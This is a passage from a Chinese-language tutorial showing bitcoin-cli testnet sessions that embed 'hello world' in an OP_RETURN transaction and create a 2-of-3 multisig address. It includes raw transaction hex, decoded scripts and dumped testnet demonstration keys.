    "txid": "28f0246fd9a867cc93b1b7e6231c47789fad8256f866c7c548d6d4ebe8cfa3a7",
    "vout": 0,
    "address": "2N8AQg8NhqVy77jPjkz7viHbvJ7aQQLcv8m",
    "label": "",
    "redeemScript": "001488ea91fb46dbf96d9d3a7e70bd1124f768ed9638",
    "scriptPubKey": "a914a3a0ba5cb95a1878466d4465ed14752b3d8292fc87",
    "amount": 0.10000000,
    "confirmations": 173,
    "spendable": true,
    "solvable": true,
    "safe": true
  },
  {
    "txid": "28f0246fd9a867cc93b1b7e6231c47789fad8256f866c7c548d6d4ebe8cfa3a7",
    "vout": 1,
    "address": "2NBPJ9qrWzbNLru6Nbi5L7DHyZZziyjzWGW",
    "redeemScript": "001491a5d0d38f307fc73d08edd24202884ff26ddfc7",
    "scriptPubKey": "a914c6f9118389ab61e9a4d8a1c8cf048b46358092a487",
    "amount": 0.99996680,
    "confirmations": 173,
    "spendable": true,
    "solvable": true,
    "safe": true
  },
  {
    "txid": "750183a0d47f62a428b4dd811eed414141d3e8013cd372930882ce11b867e7f0",
    "vout": 0,
    "address": "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ",
    "label": "",
    "redeemScript": "0014635522cd6d36b45cf770940c78642f266b143ff2",
    "scriptPubKey": "a914a23c6a5cacf99a19b5a1c0da422e4df60bc391ff87",
    "amount": 0.52800000,
    "confirmations": 1243,
    "spendable": true,
    "solvable": true,
    "safe": true
  }
]
```

获取一个新的找零地址

```bash
root@ubuntu:~# bitcoin-cli -testnet getrawchangeaddress
2N6CzPst6AajQpiiUxQ6R8qxUz6WkQD5rXD
```

创建原始交易，花费 0.1 BTC，找零 0.009 BTC，消费 0.0001 BTC，写入数据 `hello world`，对应十六进制 `68656c6c6f20776f726c64`

```bash
root@ubuntu:~# bitcoin-cli -testnet createrawtransaction "[{\"txid\":\"28f0246fd9a867cc93b1b7e6231c47789fad8256f866c7c548d6d4ebe8cfa3a7\",\"vout\":0}]" "[{\"2N6CzPst6AajQpiiUxQ6R8qxUz6WkQD5rXD\":0.099}, {\"data\":\"68656c6c6f20776f726c64\"}]"
0200000001a7a3cfe8ebd4d648c5c766f85682ad9f78471c23e6b7b193cc67a8d96f24f0280000000000ffffffff02e00f97000000000017a9148e2d74cb762bf6220ec014c4f56db8263e197eac8700000000000000000d6a0b68656c6c6f20776f726c6400000000
```

解码原始交易

```bash
root@ubuntu:~# bitcoin-cli -testnet decoderawtransaction 0200000001a7a3cfe8ebd4d648c5c766f85682ad9f78471c23e6b7b193cc67a8d96f24f0280000000000ffffffff02e00f97000000000017a9148e2d74cb762bf6220ec014c4f56db8263e197eac8700000000000000000d6a0b68656c6c6f20776f726c6400000000
{
  "txid": "c001a2f53ff6e6f399d9480767a13210ec5dfd6c849434cda25bc05a341eb251",
  "hash": "c001a2f53ff6e6f399d9480767a13210ec5dfd6c849434cda25bc05a341eb251",
  "version": 2,
  "size": 105,
  "vsize": 105,
  "weight": 420,
  "locktime": 0,
  "vin": [
    {
      "txid": "28f0246fd9a867cc93b1b7e6231c47789fad8256f866c7c548d6d4ebe8cfa3a7",
      "vout": 0,
      "scriptSig": {
        "asm": "",
        "hex": ""
      },
      "sequence": 4294967295
    }
  ],
  "vout": [
    {
      "value": 0.09900000,
      "n": 0,
      "scriptPubKey": {
        "asm": "OP_HASH160 8e2d74cb762bf6220ec014c4f56db8263e197eac OP_EQUAL",
        "hex": "a9148e2d74cb762bf6220ec014c4f56db8263e197eac87",
        "reqSigs": 1,
        "type": "scripthash",
        "addresses": [
          "2N6CzPst6AajQpiiUxQ6R8qxUz6WkQD5rXD"
        ]
      }
    },
    {
      "value": 0.00000000,
      "n": 1,
      "scriptPubKey": {
        "asm": "OP_RETURN 68656c6c6f20776f726c64",
        "hex": "6a0b68656c6c6f20776f726c64",
        "type": "nulldata"
      }
    }
  ]
}
```

导出未花费输出对应的私钥

```bash
root@ubuntu:~# bitcoin-cli -testnet dumpprivkey 2N8AQg8NhqVy77jPjkz7viHbvJ7aQQLcv8m
cQ8EFAecj5BN1ASKPrQQamCtLTQUnvw9TYUCV32KVZPTiaG1be8x
```

用私钥给原始交易签名

```bash
root@ubuntu:~# bitcoin-cli -testnet signrawtransactionwithkey 0200000001a7a3cfe8ebd4d648c5c766f85682ad9f78471c23e6b7b193cc67a8d96f24f0280000000000ffffffff02e00f97000000000017a9148e2d74cb762bf6220ec014c4f56db8263e197eac8700000000000000000d6a0b68656c6c6f20776f726c6400000000 [\"cQ8EFAecj5BN1ASKPrQQamCtLTQUnvw9TYUCV32KVZPTiaG1be8x\"] 
{
  "hex": "02000000000101a7a3cfe8ebd4d648c5c766f85682ad9f78471c23e6b7b193cc67a8d96f24f028000000001716001488ea91fb46dbf96d9d3a7e70bd1124f768ed9638ffffffff02e00f97000000000017a9148e2d74cb762bf6220ec014c4f56db8263e197eac8700000000000000000d6a0b68656c6c6f20776f726c64024830450221008064e3767209b2eb6753f2cf91ef0dc860e7ccd1d9812b5b8edd7efd94f476d20220301ef08bf7bf005e41e64f9f7eb4f507999d3900f4581983685b5367f8a95019012103dafede81c5886651093472c74e53a9caeb859577a435909a5f42a418366f81a400000000",
  "complete": true
}
```

将签名后的交易发送

```bash
root@ubuntu:~# bitcoin-cli -testnet sendrawtransaction 02000000000101a7a3cfe8ebd4d648c5c766f85682ad9f78471c23e6b7b193cc67a8d96f24f028000000001716001488ea91fb46dbf96d9d3a7e70bd1124f768ed9638ffffffff02e00f97000000000017a9148e2d74cb762bf6220ec014c4f56db8263e197eac8700000000000000000d6a0b68656c6c6f20776f726c64024830450221008064e3767209b2eb6753f2cf91ef0dc860e7ccd1d9812b5b8edd7efd94f476d20220301ef08bf7bf005e41e64f9f7eb4f507999d3900f4581983685b5367f8a95019012103dafede81c5886651093472c74e53a9caeb859577a435909a5f42a418366f81a400000000
dee761b481c08db99bb217e48f80b59edbbc8cbb0b8ff3f65dbee290fc4fb25a
```

查询交易信息

```bash
root@ubuntu:~# bitcoin-cli -testnet gettransaction dee761b481c08db99bb217e48f80b59edbbc8cbb0b8ff3f65dbee290fc4fb25a
{
  "amount": 0.00000000,
  "fee": -0.00100000,
  "confirmations": 38,
  "blockhash": "0000000000000961c078f2bcbf820b0b9691488ead63544fbf7cc90b9d4894c0",
  "blockindex": 68,
  "blocktime": 1539225516,
  "txid": "dee761b481c08db99bb217e48f80b59edbbc8cbb0b8ff3f65dbee290fc4fb25a",
  "walletconflicts": [
  ],
  "time": 1539225004,
  "timereceived": 1539225004,
  "bip125-replaceable": "no",
  "details": [
    {
      "category": "send",
      "amount": 0.00000000,
      "vout": 1,
      "fee": -0.00100000,
      "abandoned": false
    }
  ],
  "hex": "02000000000101a7a3cfe8ebd4d648c5c766f85682ad9f78471c23e6b7b193cc67a8d96f24f028000000001716001488ea91fb46dbf96d9d3a7e70bd1124f768ed9638ffffffff02e00f97000000000017a9148e2d74cb762bf6220ec014c4f56db8263e197eac8700000000000000000d6a0b68656c6c6f20776f726c64024830450221008064e3767209b2eb6753f2cf91ef0dc860e7ccd1d9812b5b8edd7efd94f476d20220301ef08bf7bf005e41e64f9f7eb4f507999d3900f4581983685b5367f8a95019012103dafede81c5886651093472c74e53a9caeb859577a435909a5f42a418366f81a400000000"
}
```

在 `https://live.blockcypher.com/` 可以查询该交易信息，如下所示：

![](pic/blockchain/op_return.png)

再次查询未花费输出

```bash
root@ubuntu:~# bitcoin-cli -testnet listunspent
[
  {
    "txid": "dee761b481c08db99bb217e48f80b59edbbc8cbb0b8ff3f65dbee290fc4fb25a",
    "vout": 0,
    "address": "2N6CzPst6AajQpiiUxQ6R8qxUz6WkQD5rXD",
    "redeemScript": "0014511b358825e232279c1b8a64a1f46307110b248a",
    "scriptPubKey": "a9148e2d74cb762bf6220ec014c4f56db8263e197eac87",
    "amount": 0.09900000,
    "confirmations": 1,
    "spendable": true,
    "solvable": true,
    "safe": true
  },
  {
    "txid": "28f0246fd9a867cc93b1b7e6231c47789fad8256f866c7c548d6d4ebe8cfa3a7",
    "vout": 1,
    "address": "2NBPJ9qrWzbNLru6Nbi5L7DHyZZziyjzWGW",
    "redeemScript": "001491a5d0d38f307fc73d08edd24202884ff26ddfc7",
    "scriptPubKey": "a914c6f9118389ab61e9a4d8a1c8cf048b46358092a487",
    "amount": 0.99996680,
    "confirmations": 177,
    "spendable": true,
    "solvable": true,
    "safe": true
  },
  {
    "txid": "750183a0d47f62a428b4dd811eed414141d3e8013cd372930882ce11b867e7f0",
    "vout": 0,
    "address": "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ",
    "label": "",
    "redeemScript": "0014635522cd6d36b45cf770940c78642f266b143ff2",
    "scriptPubKey": "a914a23c6a5cacf99a19b5a1c0da422e4df60bc391ff87",
    "amount": 0.52800000,
    "confirmations": 1247,
    "spendable": true,
    "solvable": true,
    "safe": true
  }
]
```

> 实际上，也可以直接选择一个未花费输出 `X`，将 `X` 全部当成小费构造一笔携带数据的交易，如下所示：

![](pic/blockchain/op_return0.png)

```bash
root@ubuntu:~# bitcoin-cli -testnet createrawtransaction "[{\"txid\":\"dee761b481c08db99bb217e48f80b59edbbc8cbb0b8ff3f65dbee290fc4fb25a\",\"vout\":0}]" "[{\"data\":\"68656c6c6f20776f726c64\"}]"
02000000015ab24ffc90e2be5df6f38f0bbb8cbcdb9eb5808fe417b29bb98dc081b461e7de0000000000ffffffff0100000000000000000d6a0b68656c6c6f20776f726c6400000000

root@ubuntu:~# bitcoin-cli -testnet decoderawtransaction 02000000015ab24ffc90e2be5df6f38f0bbb8cbcdb9eb5808fe417b29bb98dc081b461e7de0000000000ffffffff0100000000000000000d6a0b68656c6c6f20776f726c6400000000
{
  "txid": "8f408083dac292594b211fd45e20c6e709899d1ad45a8685e097d9217ee3f5a1",
  "hash": "8f408083dac292594b211fd45e20c6e709899d1ad45a8685e097d9217ee3f5a1",
  "version": 2,
  "size": 73,
  "vsize": 73,
  "weight": 292,
  "locktime": 0,
  "vin": [
    {
      "txid": "dee761b481c08db99bb217e48f80b59edbbc8cbb0b8ff3f65dbee290fc4fb25a",
      "vout": 0,
      "scriptSig": {
        "asm": "",
        "hex": ""
      },
      "sequence": 4294967295
    }
  ],
  "vout": [
    {
      "value": 0.00000000,
      "n": 0,
      "scriptPubKey": {
        "asm": "OP_RETURN 68656c6c6f20776f726c64",
        "hex": "6a0b68656c6c6f20776f726c64",
        "type": "nulldata"
      }
    }
  ]
}

root@ubuntu:~# bitcoin-cli -testnet dumpprivkey 2N6CzPst6AajQpiiUxQ6R8qxUz6WkQD5rXD
cNnG2j46PmUjJoKwJvZ5iTNJjhq2VBCteeoJD2NSsnSJpvdf99TB

root@ubuntu:~# bitcoin-cli -testnet signrawtransactionwithkey 02000000015ab24ffc90e2be5df6f38f0bbb8cbcdb9eb5808fe417b29bb98dc081b461e7de0000000000ffffffff0100000000000000000d6a0b68656c6c6f20776f726c6400000000 [\"cNnG2j46PmUjJoKwJvZ5iTNJjhq2VBCteeoJD2NSsnSJpvdf99TB\"]
{
  "hex": "020000000001015ab24ffc90e2be5df6f38f0bbb8cbcdb9eb5808fe417b29bb98dc081b461e7de0000000017160014511b358825e232279c1b8a64a1f46307110b248affffffff0100000000000000000d6a0b68656c6c6f20776f726c6402473044022012f153c0df6d4641d808c4becc578f5ab1178a24a7727d8453bc7321b1523ec402205593b87e6e1edb1a05dca6607381e7a3ed502a4e26f9f395d18a255fbcf3acab012102ac1069a3e25179b3f918c88837e316402414fc0cfe7ea5fab9825ecce3dbfd3f00000000",
  "complete": true
}

root@ubuntu:~# bitcoin-cli -testnet sendrawtransaction 020000000001015ab24ffc90e2be5df6f38f0bbb8cbcdb9eb5808fe417b29bb98dc081b461e7de0000000017160014511b358825e232279c1b8a64a1f46307110b248affffffff0100000000000000000d6a0b68656c6c6f20776f726c6402473044022012f153c0df6d4641d808c4becc578f5ab1178a24a7727d8453bc7321b1523ec402205593b87e6e1edb1a05dca6607381e7a3ed502a4e26f9f395d18a255fbcf3acab012102ac1069a3e25179b3f918c88837e316402414fc0cfe7ea5fab9825ecce3dbfd3f00000000
b236b8d9d5038ec304629b7c6e7a3ae9df9924bbdf552d551f7b9d90b326cf72

root@ubuntu:~# bitcoin-cli -testnet gettransaction b236b8d9d5038ec304629b7c6e7a3ae9df9924bbdf552d551f7b9d90b326cf72
{
  "amount": 0.00000000,
  "fee": -0.09900000,
  "confirmations": 0,
  "trusted": true,
  "txid": "b236b8d9d5038ec304629b7c6e7a3ae9df9924bbdf552d551f7b9d90b326cf72",
  "walletconflicts": [
  ],
  "time": 1539236481,
  "timereceived": 1539236481,
  "bip125-replaceable": "no",
  "details": [
    {
      "category": "send",
      "amount": 0.00000000,
      "vout": 0,
      "fee": -0.09900000,
      "abandoned": false
    }
  ],
  "hex": "020000000001015ab24ffc90e2be5df6f38f0bbb8cbcdb9eb5808fe417b29bb98dc081b461e7de0000000017160014511b358825e232279c1b8a64a1f46307110b248affffffff0100000000000000000d6a0b68656c6c6f20776f726c6402473044022012f153c0df6d4641d808c4becc578f5ab1178a24a7727d8453bc7321b1523ec402205593b87e6e1edb1a05dca6607381e7a3ed502a4e26f9f395d18a255fbcf3acab012102ac1069a3e25179b3f918c88837e316402414fc0cfe7ea5fab9825ecce3dbfd3f00000000"
}

root@ubuntu:~# bitcoin-cli -testnet listunspent
[
  {
    "txid": "28f0246fd9a867cc93b1b7e6231c47789fad8256f866c7c548d6d4ebe8cfa3a7",
    "vout": 1,
    "address": "2NBPJ9qrWzbNLru6Nbi5L7DHyZZziyjzWGW",
    "redeemScript": "001491a5d0d38f307fc73d08edd24202884ff26ddfc7",
    "scriptPubKey": "a914c6f9118389ab61e9a4d8a1c8cf048b46358092a487",
    "amount": 0.99996680,
    "confirmations": 219,
    "spendable": true,
    "solvable": true,
    "safe": true
  },
  {
    "txid": "750183a0d47f62a428b4dd811eed414141d3e8013cd372930882ce11b867e7f0",
    "vout": 0,
    "address": "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ",
    "label": "",
    "redeemScript": "0014635522cd6d36b45cf770940c78642f266b143ff2",
    "scriptPubKey": "a914a23c6a5cacf99a19b5a1c0da422e4df60bc391ff87",
    "amount": 0.52800000,
    "confirmations": 1289,
    "spendable": true,
    "solvable": true,
    "safe": true
  }
]
```

##### 2-3 多签

> 多重签名 2-3，表示 3 个人拥有签名权，而 2 个人签名就可以支付这个账户里的比特币。本示例中，通过构造一笔 2-3 多签交易，利用 3 个私钥签名交易，后续需要前者中的 2 个私钥才能花费该未花费输出

查询未花费输出

```bash
root@ubuntu:~# bitcoin-cli -testnet listunspent 
[
  {
    "txid": "60a4df6595762a5118f3b4f2d22f6d9b83edf35df0a2bd2001e99fd396cf9c67",
    "vout": 1,
    "address": "2N3RmG2qcyQmJ2hbKWicT7xGSJqTEZMkyQ5",
    "redeemScript": "00149a39be1c75e23903eaa348816eb6052e0fa4d103",
    "scriptPubKey": "a9146faf85885850818962c418f66fa0abbd67b0fef387",
    "amount": 0.47296264,
    "confirmations": 1,
    "spendable": true,
    "solvable": true,
    "safe": true
  },
  {
    "txid": "750183a0d47f62a428b4dd811eed414141d3e8013cd372930882ce11b867e7f0",
    "vout": 0,
    "address": "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ",
    "label": "",
    "redeemScript": "0014635522cd6d36b45cf770940c78642f266b143ff2",
    "scriptPubKey": "a914a23c6a5cacf99a19b5a1c0da422e4df60bc391ff87",
    "amount": 0.52800000,
    "confirmations": 1355,
    "spendable": true,
    "solvable": true,
    "safe": true
  }
]
```

生成 3 个新地址，并导出私钥、查看公钥

```bash
root@ubuntu:~# bitcoin-cli -testnet getnewaddress
2Mv3bjnJv2XtDjAvjYfKjwXBHCmojCiu3mz
root@ubuntu:~# bitcoin-cli -testnet dumpprivkey 2Mv3bjnJv2XtDjAvjYfKjwXBHCmojCiu3mz
cPegPf2xaeaqYB9kqqM2gzVPPXnAmwCME2KjsAQG6gkVnbxZpTKo
root@ubuntu:~# bitcoin-cli -testnet getaddressinfo 2Mv3bjnJv2XtDjAvjYfKjwXBHCmojCiu3mz 
{
  "address": "2Mv3bjnJv2XtDjAvjYfKjwXBHCmojCiu3mz",
  "scriptPubKey": "a9141eb58ab1463c6f851ad61a5fab8c76582b3cecc187",
  "ismine": true,
  "iswatchonly": false,
  "isscript": true,
  "iswitness": false,
  "script": "witness_v0_keyhash",
  "hex": "0014d5b20531701831678f620f33d3127b8dfe20b672",
  "pubkey": "02f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46",
  "embedded": {
    "isscript": false,
    "iswitness": true,
    "witness_version": 0,
    "witness_program": "d5b20531701831678f620f33d3127b8dfe20b672",
    "pubkey": "02f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46",
    "address": "tb1q6keq2vtsrqck0rmzpueaxynm3hlzpdnjjd70ms",
    "scriptPubKey": "0014d5b20531701831678f620f33d3127b8dfe20b672"
  },
  "label": "",
  "timestamp": 1528804513,
  "hdkeypath": "m/0'/0'/3'",
  "hdseedid": "44f0e603435bf5f58481b24fd597e8bd9180c840",
  "hdmasterkeyid": "44f0e603435bf5f58481b24fd597e8bd9180c840",
  "labels": [
    {
      "name": "",
      "purpose": "receive"
    }
  ]
}
root@ubuntu:~# bitcoin-cli -testnet getnewaddress
2MsJ1eKdVZrYLptCLGNrvuTvVjVQzR2FR5o
root@ubuntu:~# bitcoin-cli -testnet dumpprivkey 2MsJ1eKdVZrYLptCLGNrvuTvVjVQzR2FR5o
cQ8ZUeBy27NKafYioHp4f3isHFTFuAx65vPf6dgUgxdNSBegsW3W
root@ubuntu:~# bitcoin-cli -testnet getaddressinfo 2MsJ1eKdVZrYLptCLGNrvuTvVjVQzR2FR5o
{
  "address": "2MsJ1eKdVZrYLptCLGNrvuTvVjVQzR2FR5o",
  "scriptPubKey": "a9140086f1888f456640f895e71888570a6f2d96ba6387",
  "ismine": true,
  "iswatchonly": false,
  "isscript": true,
  "iswitness": false,
  "script": "witness_v0_keyhash",
  "hex": "0014c57b0b161ddab0c427659414f448f4bf89136ec8",
  "pubkey": "0256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d",
  "embedded": {
    "isscript": false,
    "iswitness": true,
    "witness_version": 0,
    "witness_program": "c57b0b161ddab0c427659414f448f4bf89136ec8",
    "pubkey": "0256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d",
    "address": "tb1qc4ask9sam2cvgfm9js20gj85h7y3xmkgkmhs9n",
    "scriptPubKey": "0014c57b0b161ddab0c427659414f448f4bf89136ec8"
  },
  "label": "",
  "timestamp": 1528804513,
  "hdkeypath": "m/0'/0'/4'",
  "hdseedid": "44f0e603435bf5f58481b24fd597e8bd9180c840",
  "hdmasterkeyid": "44f0e603435bf5f58481b24fd597e8bd9180c840",
  "labels": [
    {
      "name": "",
      "purpose": "receive"
    }
  ]
}
root@ubuntu:~# bitcoin-cli -testnet getnewaddress
2N4fwyEsVN9Lowja9ab5ek4R3yck3PmasdN
root@ubuntu:~# bitcoin-cli -testnet dumpprivkey 2N4fwyEsVN9Lowja9ab5ek4R3yck3PmasdN
cVTFSWeeeB9uoKZgcCbCN7eovztbQzNySGsruAFrVSiiX8ogMqtJ
```

生成 2-3 多签地址 `2MwgnLokB4WA9NLNd6yL36AvPHHVChDh5r3`

```bash
root@ubuntu:~# bitcoin-cli -testnet addmultisigaddress 2 "[\"2Mv3bjnJv2XtDjAvjYfKjwXBHCmojCiu3mz\",\"2MsJ1eKdVZrYLptCLGNrvuTvVjVQzR2FR5o\", \"2N4fwyEsVN9Lowja9ab5ek4R3yck3PmasdN\"]" "test account"
{
  "address": "2MwgnLokB4WA9NLNd6yL36AvPHHVChDh5r3",
  "redeemScript": "522102f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46210256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d210269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b553ae"
}
```

```bash
root@ubuntu:~# bitcoin-cli -testnet validateaddress 2MwgnLokB4WA9NLNd6yL36AvPHHVChDh5r3
{
  "isvalid": true,
  "address": "2MwgnLokB4WA9NLNd6yL36AvPHHVChDh5r3",
  "scriptPubKey": "a91430b5e8e9151e46be789562580b0118911d875f3d87",
  "isscript": true,
  "iswitness": false
}
```

解码赎回脚本

**赎回脚本由如下几部分组成：**`52` `21` `02f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46` `21` `0256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d` `21` `0269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b5` `53` `ae`

- 0x52 = OP_2
- 0x21 = OP_PUSHDATA 33 bytes (hex: 0x21)
- 0x02f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46 = the next 33 bytes (public key)
- 0x21 = OP_PUSHDATA 33 bytes (hex: 0x21)
- 0x0256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d = the next 33 bytes (public key)
- 0x21 = OP_PUSHDATA 33 bytes (hex: 0x21)
- 0x0269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b5 = the next 33 bytes (public key)
- 0x53 = OP_3
- 0xae = OP_CHECKMULTISIG

```bash
root@ubuntu:~# bitcoin-cli -testnet decodescript 522102f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46210256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d210269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b553ae
{
  "asm": "2 02f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46 0256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d 0269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b5 3 OP_CHECKMULTISIG",
  "reqSigs": 2,
  "type": "multisig",
  "addresses": [
    "mzzsUyocJXwrbQi13k1YVYuvUPKUL6H2Gz",
    "myX8p3UGzyxJDEGxdBd3LouRjPahjpPvs4",
    "mn6U9CQDBa5qM5WAg7KZQA9v4Z119UBCCZ"
  ],
  "p2sh": "2N5pft6YKrBmTi3UW3LXkaxjGFr9SQ2U3bE",
  "segwit": {
    "asm": "0 fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3a",
    "hex": "0020fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3a",
    "reqSigs": 1,
    "type": "witness_v0_scripthash",
    "addresses": [
      "tb1qlck8mzyx6mdv4mznpyt2zz9d9hgyp7lh9jqw50wad48jyrn73vaqvvpppr"
    ],
    "p2sh-segwit": "2MwgnLokB4WA9NLNd6yL36AvPHHVChDh5r3"
  }
}
```

> 查看上述地址中信息，以 `mzzsUyocJXwrbQi13k1YVYuvUPKUL6H2Gz` 为例

```bash
root@ubuntu:~# bitcoin-cli -testnet validateaddress mzzsUyocJXwrbQi13k1YVYuvUPKUL6H2Gz                                                                                     {
  "isvalid": true,
  "address": "mzzsUyocJXwrbQi13k1YVYuvUPKUL6H2Gz",
  "scriptPubKey": "76a914d5b20531701831678f620f33d3127b8dfe20b67288ac",
  "isscript": false,
  "iswitness": false
}
root@ubuntu:~# bitcoin-cli -testnet decodescript 76a914d5b20531701831678f620f33d3127b8dfe20b67288ac
{
  "asm": "OP_DUP OP_HASH160 d5b20531701831678f620f33d3127b8dfe20b672 OP_EQUALVERIFY OP_CHECKSIG",
  "reqSigs": 1,
  "type": "pubkeyhash",
  "addresses": [
    "mzzsUyocJXwrbQi13k1YVYuvUPKUL6H2Gz"
  ],
  "p2sh": "2N8egGvjyaT1Kfm44bCNXNtztcWG8kZDz99",
  "segwit": {
    "asm": "0 d5b20531701831678f620f33d3127b8dfe20b672",
    "hex": "0014d5b20531701831678f620f33d3127b8dfe20b672",
    "reqSigs": 1,
    "type": "witness_v0_keyhash",
    "addresses": [
      "tb1q6keq2vtsrqck0rmzpueaxynm3hlzpdnjjd70ms"
    ],
    "p2sh-segwit": "2Mv3bjnJv2XtDjAvjYfKjwXBHCmojCiu3mz"
  }
}
```

向多签地址 `2MwgnLokB4WA9NLNd6yL36AvPHHVChDh5r3` 转账

![](pic/blockchain/send_to_address.png)

```bash
root@ubuntu:~# bitcoin-cli -testnet sendtoaddress 2MwgnLokB4WA9NLNd6yL36AvPHHVChDh5r3 0.527
5332ed1482e665c6f7146283991ad69c05af99cfebab344729d54b382f68a46c
```

查询交易信息

```bash
root@ubuntu:~# bitcoin-cli -testnet gettransaction 5332ed1482e665c6f7146283991ad69c05af99cfebab344729d54b382f68a46c
{
  "amount": 0.00000000,
  "fee": -0.00000646,
  "confirmations": 566,
  "blockhash": "00000000000002cfc4df802cec81a71db91226d891967461d13fd2efc4a1e12a",
  "blockindex": 55,
  "blocktime": 1539251947,
  "txid": "5332ed1482e665c6f7146283991ad69c05af99cfebab344729d54b382f68a46c",
  "walletconflicts": [
  ],
  "time": 1539251710,
  "timereceived": 1539251710,
  "bip125-replaceable": "no",
  "details": [
    {
      "address": "2MwgnLokB4WA9NLNd6yL36AvPHHVChDh5r3",
      "category": "send",
      "amount": -0.52700000,
      "label": "test account",
      "vout": 1,
      "fee": -0.00000646,
      "abandoned": false
    },
    {
      "address": "2MwgnLokB4WA9NLNd6yL36AvPHHVChDh5r3",
      "category": "receive",
      "amount": 0.52700000,
      "label": "test account",
      "vout": 1
    }
  ],
  "hex": "02000000000102f0e767b811ce82089372d33c01e8d3414141ed1e81ddb428a4627fd4a08301750000000017160014635522cd6d36b45cf770940c78642f266b143ff2feffffff679ccf96d39fe90120bda2f05df3ed839b6d2fd2f2b4f318512a769565dfa46001000000171600149a39be1c75e23903eaa348816eb6052e0fa4d103feffffff022233d3020000000017a91474e740e17eab3f6afbc65b68e06607bafb71b50b87602324030000000017a91430b5e8e9151e46be789562580b0118911d875f3d8702483045022100fc4ed93bf11a84d3ebf3a32850b27df4e800f4d7cdcb079278685866d7d0196102206313c70b24dbbfb9ed014a7613997645b2fa5ffcb03856cb156be581428ea6f6012102838aa4c771101a3045692ff1e49a583dd1a7e537f855bbe30324eed283cc8b300247304402201f19da9f999249041880ecc4319f42890ffddb3502941cc2dd1daf929e77952e0220675603fc6608f4ad5aa09eb8e6dde071ed0354f259cd0c5906a489f3851d62e901210393822b1788b15dee5cd629ebd018a29d3a3d644415810d464b309fbcffa8f0654fe81500"
}
```

解码原始交易

```bash
root@ubuntu:~# bitcoin-cli -testnet decoderawtransaction 02000000000102f0e767b811ce82089372d33c01e8d3414141ed1e81ddb428a4627fd4a08301750000000017160014635522cd6d36b45cf770940c78642f266b143ff2feffffff679ccf96d39fe90120bda2f05df3ed839b6d2fd2f2b4f318512a769565dfa46001000000171600149a39be1c75e23903eaa348816eb6052e0fa4d103feffffff022233d3020000000017a91474e740e17eab3f6afbc65b68e06607bafb71b50b87602324030000000017a91430b5e8e9151e46be789562580b0118911d875f3d8702483045022100fc4ed93bf11a84d3ebf3a32850b27df4e800f4d7cdcb079278685866d7d0196102206313c70b24dbbfb9ed014a7613997645b2fa5ffcb03856cb156be581428ea6f6012102838aa4c771101a3045692ff1e49a583dd1a7e537f855bbe30324eed283cc8b300247304402201f19da9f999249041880ecc4319f42890ffddb3502941cc2dd1daf929e77952e0220675603fc6608f4ad5aa09eb8e6dde071ed0354f259cd0c5906a489f3851d62e901210393822b1788b15dee5cd629ebd018a29d3a3d644415810d464b309fbcffa8f0654fe81500
{
  "txid": "5332ed1482e665c6f7146283991ad69c05af99cfebab344729d54b382f68a46c",
  "hash": "4f388f0ec97318d91a0624468dbffbf3f2c6b4ce349ca5edd70b07e69ac9851c",
  "version": 2,
  "size": 419,
  "vsize": 257,
  "weight": 1025,
  "locktime": 1435727,
  "vin": [
    {
      "txid": "750183a0d47f62a428b4dd811eed414141d3e8013cd372930882ce11b867e7f0",
      "vout": 0,
      "scriptSig": {
        "asm": "0014635522cd6d36b45cf770940c78642f266b143ff2",
        "hex": "160014635522cd6d36b45cf770940c78642f266b143ff2"
      },
      "txinwitness": [
        "3045022100fc4ed93bf11a84d3ebf3a32850b27df4e800f4d7cdcb079278685866d7d0196102206313c70b24dbbfb9ed014a7613997645b2fa5ffcb03856cb156be581428ea6f601",
        "02838aa4c771101a3045692ff1e49a583dd1a7e537f855bbe30324eed283cc8b30"
      ],
      "sequence": 4294967294
    },
    {
      "txid": "60a4df6595762a5118f3b4f2d22f6d9b83edf35df0a2bd2001e99fd396cf9c67",
      "vout": 1,
      "scriptSig": {
        "asm": "00149a39be1c75e23903eaa348816eb6052e0fa4d103",
        "hex": "1600149a39be1c75e23903eaa348816eb6052e0fa4d103"
      },
      "txinwitness": [
        "304402201f19da9f999249041880ecc4319f42890ffddb3502941cc2dd1daf929e77952e0220675603fc6608f4ad5aa09eb8e6dde071ed0354f259cd0c5906a489f3851d62e901",
        "0393822b1788b15dee5cd629ebd018a29d3a3d644415810d464b309fbcffa8f065"
      ],
      "sequence": 4294967294
    }
  ],
  "vout": [
    {
      "value": 0.47395618,
      "n": 0,
      "scriptPubKey": {
        "asm": "OP_HASH160 74e740e17eab3f6afbc65b68e06607bafb71b50b OP_EQUAL",
        "hex": "a91474e740e17eab3f6afbc65b68e06607bafb71b50b87",
        "reqSigs": 1,
        "type": "scripthash",
        "addresses": [
